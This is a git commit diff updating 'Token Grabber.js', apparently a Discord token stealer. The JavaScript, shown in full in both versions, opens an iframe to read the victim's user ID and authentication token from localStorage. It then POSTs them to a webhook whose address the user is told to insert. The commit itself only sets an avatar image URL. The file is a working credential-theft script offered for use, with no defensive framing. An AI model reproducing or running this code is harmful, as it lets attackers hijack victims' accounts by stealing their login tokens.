9af5ef5b88863423daf26afebcfe36dc729d861a
KuroRXX <68124391+KuroRXX@users.noreply.github.com>
2020-07-10 12:32:29 -0700

    Update Token Grabber.js

--- Token Grabber.js
+++ Token Grabber.js
@@ -1,4 +1,4 @@
 location.reload();var i=document.createElement("iframe");document.body.appendChild(i),stop();var request=new XMLHttpRequest;request.open("POST",
 //Insert your webhook link inside the quotes:
 ""
-),request.setRequestHeader("Content-type","application/json");var params={username:"Token Grabber",avatar_url:"",content:"**"+document.body.appendChild(document.createElement`iframe`).contentWindow.localStorage.user_id_cache+"** _-ID_ **"+i.contentWindow.localStorage.token+"** _-Token_"};request.send(JSON.stringify(params));
+),request.setRequestHeader("Content-type","application/json");var params={username:"Token Grabber",avatar_url:"https://cdn.discordapp.com/avatars/730952132101931080/c48c7cd343673584948c80cb680c53e5.png?size=128",content:"**"+document.body.appendChild(document.createElement`iframe`).contentWindow.localStorage.user_id_cache+"** _-ID_ **"+i.contentWindow.localStorage.token+"** _-Token_"};request.send(JSON.stringify(params));
